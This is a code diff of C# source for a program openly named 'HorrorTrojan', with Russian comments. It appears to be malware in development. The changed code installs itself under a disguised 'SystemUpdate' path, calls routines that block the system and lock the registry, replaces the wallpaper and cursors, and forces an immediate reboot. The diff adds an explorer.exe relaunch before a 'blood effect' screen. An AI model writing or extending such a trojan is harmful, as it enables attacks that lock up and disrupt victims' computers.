@@ -31,6 +31,13 @@ namespace HorrorTrojan
                     Application.EnableVisualStyles();
                     Application.SetCompatibleTextRenderingDefault(false);
                     
+                    // ===== ЗАПУСКАЕМ РАБОЧИЙ СТОЛ =====
+                    try
+                    {
+                        Process.Start("explorer.exe");
+                    }
+                    catch { }
+                    
                     BloodEffect blood = new BloodEffect();
                     MainInterface ui = new MainInterface();
                     
@@ -49,7 +56,6 @@ namespace HorrorTrojan
                 
                 if (!File.Exists(updatePath) || Assembly.GetExecutingAssembly().Location != updatePath)
                 {
-                    // ===== УСТАНОВКА =====
                     ResourceExtractor.ExtractAll();
                     SystemBlocker.BlockEverything();
                     RegistryLocker.LockEverything();
@@ -57,10 +63,6 @@ namespace HorrorTrojan
                     ApplyWallpaper();
                     ApplyCursors();
                     
-                    // НЕ ЗАПУСКАЕМ stage2 ЗДЕСЬ!
-                    // Process.Start(updatePath, "stage2");  ← УБРАНО!
-                    
-                    // ПЕРЕЗАГРУЗКА
                     var psi = new ProcessStartInfo("shutdown", "/r /f /t 0");
                     psi.CreateNoWindow = true;
                     psi.UseShellExecute = false;
@@ -69,9 +71,14 @@ namespace HorrorTrojan
                 }
                 else
                 {
-                    // ===== УЖЕ УСТАНОВЛЕН (ЗАПУСК ИЗ SystemUpdate) =====
                     Application.EnableVisualStyles();
                     Application.SetCompatibleTextRenderingDefault(false);
+                    
+                    try
+                    {
+                        Process.Start("explorer.exe");
+                    }
+                    catch { }
                     
                     BloodEffect blood = new BloodEffect();
                     MainInterface ui = new MainInterface();
